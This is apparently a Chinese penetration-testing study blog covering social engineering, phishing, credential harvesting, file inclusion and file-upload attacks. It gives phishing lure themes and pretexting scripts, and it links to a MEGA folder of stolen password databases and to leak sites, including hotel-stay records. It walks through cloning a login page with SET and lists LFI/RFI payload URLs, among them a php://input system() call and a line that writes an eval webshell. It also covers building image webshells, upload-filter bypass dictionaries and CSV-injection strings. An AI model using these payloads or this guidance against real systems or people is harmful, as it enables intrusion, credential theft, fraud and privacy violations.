![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629212757948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

 ## 中间件漏洞

 ### 资源推荐

 当你扫描出中间件的类型和查看此文档，看看有没有相应的漏洞 http://0x3.biz/usr/uploads/2019/07/2451315420.pdf
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210627125949389.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
另一个推荐的文档是
还有靶机可使用 https://vulhub.org/#/environments/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210627130752990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



## 请求数据包漏洞

GET /home.html HTTP/1.1
Host: developer.mozilla.org
User-Agent: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://developer.mozilla.org/testpage.html
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Mon, 18 Jul 2016 02:36:04 GMT
If-None-Match: "c561c68d0ba92bbeb8b0fff2a9199f722e3a621a"
Cache-Control: max-age=0

## 社会工程学

tg机器人
钓鱼 Wifi、社工库、BadUSB、运营商劫持、水坑攻击、鱼叉攻击、信息泄露、钓鱼邮件等等，差点就说绑架员工了）

很多黑客技巧都需要综合使用社会工程学。
比如：

>恶意XSS链接
>csrf链接

### 套话

友套近乎，“他是我一个之前某某某游戏认识的，您能给我一下他的微信吗，好久没跟他聊了”

#### 社交媒体

通过搜索公司的QQ群、钉钉群,伪装成员工获取敏感截图和没被公知的网站

### 钓鱼

其攻击的目标众多且广泛，包括政府部门、大型国企、金融机构、科研机构以及部分重要的私营企业等。该组织攻击人员非常熟悉我国，对我国的时事、新闻热点、政府结构等都非常熟悉，如刚出个税改革时候，就立马使用个税改革方案做为攻击诱饵主题。此外钓鱼主题还包括绩效、薪酬、工作报告、总结报告等。
宏 – Office
DLL劫持
假冒加固工具
木马捆绑

#### 钓鱼 wifi

##### 鱼叉攻击

“鱼叉攻击”通常是指利用木马程序作为电子邮件的附件，发送到目标电脑上，诱导受害者去打开附件来感染木马。
附件有许多选项， 例如 Microsoft Office 文档， 可执行文件， PDF 或存档文件。 打开附件后， 攻击者的有效负载会利用漏洞或直接在用户的系统上执行。 鱼叉式网络钓鱼电子邮件的文本通常试图给出一个合理的理由，说明为什么要打开文件， 并且可以解释如何绕过系统保护以便这样做。 

#### 水坑攻击

在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化这块的工作。

#### 钓鱼邮件

#### 钓鱼技巧

**内容选择**

>* 实时社会新闻：10月1日国庆小长假结束后关于疫情返京统计为主旨。如果不小心或者公司有相关统计要求的情况真的很容易就中招了
>* 简历
>* 技术交流
>* 公司福利活动，请登录下载领取；
>* 软件更新



### 定向社工

> * 加好友
>   拿老师电话

>时间：2007-3-14 19：52 门卫部 道具：<<C++ Primer>> 冒称身份：学生李勇
>李勇：你好，我是C323班李勇。 
>门卫A：什么事？ 
>李勇：是这样的，昨天借了老师的一本书，但我忘记他的联系方式。 
>门卫B：哦，在桌子上压着，自已看。 
>李勇：我找找下。 
>李勇：唉，没找到，但我看见几个认识的老师的电话号码，我可以拿着拷贝一份吗？ 
>门卫A：不可以! 
>门卫B：你去学生科找找看吧。 
>李勇：好吧，谢谢。

**收集情报**
**获得公司ip，邮箱地址**对公司攻击时，找到销售邮箱，显示对产品感兴趣。当销售回邮件时可以分析邮件头真实ip，邮箱服务器地址
**域劫持** 当破解成功一位员工的密码时，请求管理员修改密码，这时候将会能对域进行劫持
**趋势**
网络安全防火墙被越来越多的公司重视，技术攻击可能会变得更难，但社会工程学利用人性做一些简单的工作就可以拿到更高机密的东西。社会工程学实施者就是所谓骗子，毕竟这不是什么有道德的事情，那下文就对这类人直称骗子。
**骗子特性**
低调，即便劣迹斑斑，却不会对任何人承认劣迹，就像蜜罐不愿意告诉苍蝇这里有危险。
十分重视表面看上去无利害的信息。
**生活中骗子**
如果骗子是在某行业混久了发现行业的漏洞，那么他是个不足够灵活的骗子。对于很多熟练如何行骗的人，都是先盯上某行发现其有大收益，接下来在对此内部人员调研更多信息。
**打探信息**
	对于打探更多的信息，这些信息收集通常都是敏感的，这时候你需要**给自己另一个身份**，比如你是记者、或在写一本调查书、或你是大学生需要得到一些信息、或你是内部员工或你是公司产品售后寻求调研。**打探信息第一步是**收集专业术语，如果收集信息遇到的人足够配合甚至可以问更多细节，否则在对方怀疑时就要停止问敏感信息。
	**如何知道对方是否产生怀疑**，试着问对方一个私人问题，比如：“你在这里工作多久了？”
	何时挂断电话，在问完关键问题时候，千万不要马上结束谈话，多问两三个关键问题，因为人最可能想起的是最后一个问题。



## 如何在本地查询

上面两个步骤的方法，只可查询的部分数据是因为数据总量非常大，不适合放在公网。其来源于 Telegram 电报群。它是放在 mega nz 网盘里面的，我也就把转存在自己的网盘里面了。在 MEGA NZ 网盘上分享由黑客盗取的数据库/密码是违反网盘存放规定的，若被举报，此处链接将不再补新。同时我也会失去账号以及源文件，但是对我损失不是很大，我再也不想拥有上帝之眼了。

```
https://mega.nz/folder/H54izYIIQ9zJBCd8uIpmqCAd7DGf3w
```


普通记事本文件是无法打开如此庞大的 txt 文件的，更别谈快速索引了。因此需要安装这款比较专业的软件。建议需要在超级固态硬盘的电脑上面使用，不然也是非常慢的。

```
https://www.emeditor.com/download/
```


其他一些社工库

http://shenkur/passd/

http://scnitpr/

http://cnseur/frumphp

开房记录：http://594skcm/
![在这里插入图片描述](https://img-blog.csdnimg.cn/202105061748366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210506174808635.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
**setookit**
默认集成在了kali；
社会工程学模块包含了很多功能，若鱼叉式网络攻击、网页攻击、邮件群发攻击、无线接入点攻击、二维码攻击等等。
如果你使用网络攻击在复制完站点后，为达到更加真实效果，进入https://www.freenom.com/zh/index.html?lang=zh申请免费的域名。输入想要的名字默认三个月的使用时间，使用电子邮箱验证登录
使用临时邮箱注册并接收申请域名邮件http://www.yopmail.com/zh/
登陆阿里云，进入dns控制台添加域名，
添加并配置好记录，然后进入云服务器管理控制台，点击实例名进入。Xshell连接服务器，开启http服务。
[网站钓鱼攻击，图文请看这篇博客](https://www.freebuf.com/articles/web/253320.html)

在set>提示符中输入1（Social-Engineering Attacks）并按下回车。
现在选择Website Attack Vectors（选项2）。
从下面的菜单中，我们选择Credential Harvester Attack Method（选项3）。
选择Site Cloner（选项2）。
它会询问IP address for the POST back in Harvester/Tabnabbing。它的意思是收集到的证书打算发送到哪个 IP。这里，我们输入 Kali 主机在vboxnet0中的 IP 192.168.56.1。
下面，压脚询问要克隆的 URL，我们会从 vulnerable_vm 中克隆 Peruggia 的登录表单。输入http://192.168.56.102/peruggia/index. php?action=login。
现在会开始克隆，之后你会被询问是否 SET 要开启 Apache 服务器，让我们这次选择Yes，输入y并按下回车。


http://tool.chinaz.com/tools/dwz.aspx?qq-pf-to=pcqq.group

## 中间人攻击

**中间人攻击**
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507195133430.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![ ](https://img-blog.csdnimg.cn/20210507200212915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507200853468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## 反序列化（对象注入）

序列化就是将一个对象转换为字符串
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623164314595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

~说说反序列化的原理
 -- 序列化：将php中对象、类、数组、变量、匿名函数等，转化为字符串 方便保存到数据库或者文件中（将状态信息保存为字符串）
 -- 反序列化： 将字符串保存为状态信息

 ~反序列化会用到哪些函数
 -- php的函数
 -- 反序列化貌似hr更想问java的
 -- 更多请百度：WebLogic 反序列化，将这个理解透彻和hr聊问题就不大了

### PHP序列化与反序列化

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623165359769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623165636650.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623165608488.png)
php序列化与反序列化相关函数

```bash
对象转换为字符串/字符串转换为对象
serialize()/unserialize()
```

不注释那句话如果用户输入phpinfo就会显露敏感信息i
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623173036387.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


这个漏洞很难被利用
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210623174256404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

weblogic的反序列化

## 重放攻击

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507194018359.png)
比如购物支付一次，在重放攻击下可能达到一百次的购买。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507194058912.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507194157586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507194501837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210507194643753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

## html 注入

## 下载漏洞

前提是网站有比如“点击下载”的按钮。下载后分析文件地址
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210702164934707.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210702163522138.png)
## 文件操作
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712164618229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
1.文件被解析，则是文件包含漏洞
2.显示源代码，则是文件读取漏洞
3.提示文件下载，则是文件下载漏洞

### 文件包含
将文件包含进去，调用指定文件的代码.这种漏洞也很好被确定，一般url包含形如file=1.txt的参数就可以疑似了。在进一步直接访问url/1.txt，如果返回的界面与带参数file=1.txt一样那么你就可以确认这是文件包含了 
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712150822393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


文件包含的写法

```bash
<!--#include file="1.asp" -->
<!--#include file="top.aspx" -->
<c:import url="http://thief.one/1.jsp">
<jsp:include page="head.jsp"/>
<%@ include file="head.jsp"%>
<?php Include('test.php')?>
```

#### 本地文件包含
这类漏洞处理的两种方案，1进入你发现的敏感文件
2 上传木马到文件，然后进行文件读取
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712162319492.png)

**无限制包含**
类似于如下，直接执行命令就可以进行文件的读取。
http://127.0.0.1:8080/include.php?filename=1.txt
http://127.0.0.1:8000/include.php?filename=../../../www.txt

**有限制**
这个限制可能是filename=1.txt网页后端强制添加后缀如加上'.html'

加特殊符号如？或者%23
%00截断：条件：magic_quotes_gpc=Off php版本<5.3.4（条件比较严格，不太推荐）

```bash
filename=../../../www.txt%00
```

溢出截断：条件：windows，点号需要长于256；linux长于4096 。
因爲.对于文件尾巴命名而言是没什么意义的

> windows:1.txt/././././././././././././././././././././././././././././././././././././././././././././
> 或
> 1.txt......................................................................................................................................................................................

  

     linux：1.txt............................................................................................................................

#### 远程协议包含
远程包含的危害要比本地文件包含的危害要大。
当all_url_include是开启的，就可以执行远程.
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712153658277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
你所需要准备一个远程文件，可以是txt，只要里面包含有敏感代码,网站是什么语言，你就写什么语言的代码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712154532580.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

http://127.0.0.1:8080/iclude.php?filename=http://www.xiaodi8.com/readme.txt
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%20
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%23
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt? 
#### 何种协议流玩法
前面远程和本地都是通过漏洞扫描工具等测出来的，协议流方法才是真正手工测试的方案。
https://www.cnblogs.com/endust/p/11804767.html
http://127.0.0.1:8080/include.php?filename=php://filter/convert.base64-encode/resource=1.txt
http://127.0.0.1:8080/include.php?filename=php://input POST:<?php system('ver')?>
<?php fputs(fopen('s.php'，'w'),'<?php @eval($_POST[cmd])?>';?>
http://127.0.0.1:8000/include.php?filename=file:///D:/phpstudy/PHPTutorial/www/1.txt
http://127.0.0.1:8080/include.php?filename=data://text/plain,<?php%20phpinfo();?>
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712160934174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
#### 防御
WAF
固定后缀
写固定比如后端只接受1.txt文件，其他一律不处理
### 文件下载
凡是网站有文件下载的功能都有可能发生漏洞。我们可以去分析下载链接和文件链接，已确定下载代码是在哪个目录。我们可以利用此漏洞下载敏感文件比如数据库配置等，也可以下载有价值的网站源码。值得注意的一点是我们下载的index.php（做个例子实际下index没太大意义）和网页展示的php通常不会是一样文件，前者源码包含的文件更多，后者是解析后的文件。
一般文件下载参数以post传递
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712170018155.png)

**下载哪些文件**
配置文件（数据库，平台，各种等）

**公开漏洞**
小米路由器
### 文件上传漏洞
如果非常规类型，我们判断出来就用相应方案，而不是一上来就用常规测试方法。对文件上传类型进行区分，是属于编辑器文件上传，还是属于第三方应用，还是会员中心。要确保文件上传是什么类型，就用什么类型方法对它进行后期测试。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708210532166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

这个洞遇到的也比较多，一般来说是后端没有限制上传文件的类型。但是上传的脚本文件也不会解析。也就没有办法getshell。
(很多SRC对于上传到cdn云服务器的任意文件上传是忽略的)。这个漏洞要结合Webshell才有效果,具体请看后面webshell小节。


上传含有xss代码的html文件，造成存储型xss(如果上传到了cdn服务器之类的大概率忽略)。
上传恶意文件进行钓鱼
尝试在上传的文件名前加../进行目录穿越。
可以结合其他漏洞比如CORS漏洞扩大危害。

字典生成 https://github.com/c0ny1/upload-fuzz-dic-builder

目录穿越
上传后如果没有被文件重命名，可以在文件名值做目录跳转
注意一些像目录的参数名
dir　path　location　url

长文件名
长Content-Disposition
特殊文件
svg / html / htm / swf
xss
pdf
chrome 里可以跳转
cer / asa / spx / php5 / phtml
可能会被当做动态语言解析
.htaccess / .user.ini / web.config / web.xml
修改解析规则
.xls / .xlsx
POI Excel XXE
.tar / .tar.gz / .zip
可能存在文件释放目录跳转问题
.pkl
python反序列化文件
.xml
可能有 XXE
.yaml / .yml
YAML 反序列化
.jar / .class
上传到 java classpath 的目录下，类被加载时执行代码
无大小和次数限制
无限上传制造垃圾数据堵死硬盘
有图片加工的地方可以注意一下imagemagick命令执行

文件读取
读取系统敏感文件
文件包含
可读取文件或代码执行
文件删除
删除配置文件可破坏网站
删除安装锁可重装
文件解压
如果上传文件为 tar / tar.gz 类型，可以尝试构压缩包内文件名为../../../../xxx 的tar包
文件导出
如果是CSV 或者 Excel可以注意一下CSV注入
=2222-1
-1+1=2222-1
@=2222-1
\r\n=2222-1
111,=2222-1,

**经验**
上传参数名解析：明确那些东西能修改？
Contont-Disposition：一般可更改
Name：表单参数值，不能更改
Filename：文件名，可以更改
#### 执行
##### 明確只能上传图片
比如程序员写了要获取图片尺寸的或
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135957977.png)

这时候你就需要配合其他漏洞才可以执行。
##### +解析漏洞
解析漏洞存在的条件是比较苛刻的，他要求是nginx、apache等服务器；*具体待补充*
图片马制作很简单，你可以轻松的上传它，但是如何执行起来就是另一项技术。
生成在同级文件下放入一句话木马和图，将其在win的cmd下输入

```bash
copy 1.jpg /b+1.php/a 1.jpg
```

和在一起后上传图片。
或者
你右击打开图片用编辑器编辑它，在尾巴后面加上php代码`<?php phpinfo();?>`

当上传成功图片后会正确显示，如果对方存在解析漏洞，在图片的地址后加上/1.php就会导致图片被执行成脚本，图片的尾巴代码就会被执行出
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708212810712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

判断一个网站有没有解析漏洞只需要访问其jpg文件，在加上`/.php`看返回结果就知道了.如果返回的是404就证明没有漏洞，如果是乱码就证明有漏洞
##### +文件包含漏洞
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135206289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709135133834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### + IIS6.0上传漏洞
现在这个版本已经不太常见了
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709153926671.png)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021070915424534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

##### + Apache解析漏洞-低版本2.X
符合Apache低版本就有漏洞
x.php.xxx.yyy
识别最后的yyy，如果不识别的就向前解析，直到识别。
利用场景：
如果对方中间件apache属于低版本，我们可以利用文件上传，上传一个不识别的文件后缀，利用解析漏洞规则成功解析文件，其中后门代码被触发。
##### +Apache2.4.0-2.4.29换行解析
换行解析漏洞
https://vulhub.org/#/environments/httpd/CVE-2017-15715/
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709161011292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

Nginx解析漏洞-vulhub

Nginx文件名逻辑-vulhub

各个WEB编辑器安全讲解
网站后台里面有操作添加文字等类似功能的时候，有些网站会套用第三方的编辑器去对文章、图片、音频等进行相关处理。如果一个网站里面有编辑器的话，那么这个编辑器是什么类型，有没有漏洞，也会成为我们利用条件。

https://navisec.it/编辑器漏洞手册/
各个CMS文件上传简要讲解
wordpress，phpcms

##### 待补充： +weblogic
##### +firecms上传漏洞
修改uid为3
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708230507178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210708230515619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
##### 待补充：+CVE-2017-12615:tomcat任意文件上传
##### +竞态
二次渲染就是当系统收到用户上传的图片时，先进行保存到服务器，或者是为了方便用户进行图片的删除或者改大小。这通常就涉及到两次保存，一般程序员在保存第一次时可能疏忽不会写冗长的代码来过滤。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709142526875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
只要成功保存一次，对于我们其实就够了，利用竞态，在文件被服务器删除之前访问。这时候对于系统来说就是打开了文件，打开就不能进行删除了。你制造竞态只需要不断请求修改数据包即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709144403839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709143746379.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709143902195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
启动爆破后，打开网页对php进行多次刷新访问，如果弹出一串奇怪的代码那就说明你已经执行成功了。这时候你要做的就是停止再刷新界面，将此界面保持就可以进行后门操作
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709144624895.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
##### 编辑器
这里不用说太多，只要你发现对方采用了编辑器，百度编辑器漏洞就可以找到利用方法。如图就采用了一个编辑器
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709172009109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


##### 常规上传

* 文件夹绕过
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709151241163.png)


* Apache。解析顺序中，是从右往左开始解析后缀的，如果遇到1.php.xxx，那么1.php就会被解析
* 如果后端有读取图像类型比如getimagesize()如果错误那么你将不会被上传成功，这时候你可以将图片和webshell合并一个文件，命令是 cat 1.jpg 2.php > webshell.php
* 竞态条件上传，在系统将你的php删除之前，在网站中调用的你php文件，那么代码就会被保留。
* php小于5.3.4会把00后面字符删除。上传name=1.php%00.jpg只需要注意一点是get会自动解码 %00
post不会解码需要上传数据时将 %00转换为url编码
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709132837178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


* 前端JS检测绕过。当然如果文件从前端过来后，后端仍旧对格式有上传后缀名判断，这种方式是行不通的
* ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512185959272.png)
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210512190248641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
  
 * 如果php5 php3 phtml..没有定义到后名单里，可以用这格式绕过限制值得注意的点是，如果目标网站的程序员修改了设置执行这种代码的文件（默认是开启的，脚本可执行的），你就无法执行该文件，上传的脚本就像一个文本一样躺在那里
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709010254367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)


* 最老套的方法是用Content-Type值判断的，这时候比如服务器只能允许上传image/jpeg，那么上传了php后，通过burpsuite拦截，可以看到content-type变为了application/octet-stream，在加上content-Type改为image/jpeg就能完成上传。但是如果目标网站开启了WAF这种方法仍旧行不通。
* windows解析php特有技巧，将.php文件加上`：：&DATA`
* 将上传名加一个空格`1.php `，这样你可能绕过开发者写的匹配规则。但是文件上传到系统后是会强行去掉你加的空格，这样你的文件就能保证成功执行了。类似的还有加上`.`

* 简要上传表单代码分析解释
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709002346399.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
* .htaccess文件配置覆盖。当没有过滤.htaccess文件时，这个漏洞可以被执行。执行方法是1.创建.htaccess文件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709011811865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
下载一张后缀名为jpg的图片，把图片名改为shana，打开图片，在最后增加一行php代码，然后上传
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709011838515.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)

* 代码替换关键字


>代码将字符串里的php替换为空
一次过滤
a.php -> a.
a.pphphp -> a.php

>循环过滤 递归过滤
a.pphphp -> a.

以下字典是我根据本文的方法进行的初步总结，但这样的字典明显太小，你需要用网上公开的fuzz字典，推荐一个 https://github.com/c0ny1/upload-fuzz-dic-builder
```bash
.
 
::$$DATA
.php3
.php5
. .
.pphphp
%00.jpg
.PHp3
%00.jpg
/.jpg
;.jpg
.xxx
;.php
.p\nh\np

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210709192845136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)



## 逻辑越权
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210712191714272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
### 越权
用户登录的过程是先检测账户名和密码是不是对应得上，对应得上在根据用户的组给予相应权限。
****
水平越权：通过更换的某个ID之类的身份标识，从而使A账号获取(修改、删除等)B账号数据

垂直越权：使用低权限身份的账号，发送高权限账号才能有的请求，获得其高权限的操作。

未授权访问：通过删除请求中的认真信息后重放该请求，依旧可以访问或者完成操作。
#### 水平越权
原理：

 - 前端安全造成：界面判断用户等级后，代码界面部分进行可选显示。
 - 后盾安全造成：数据库

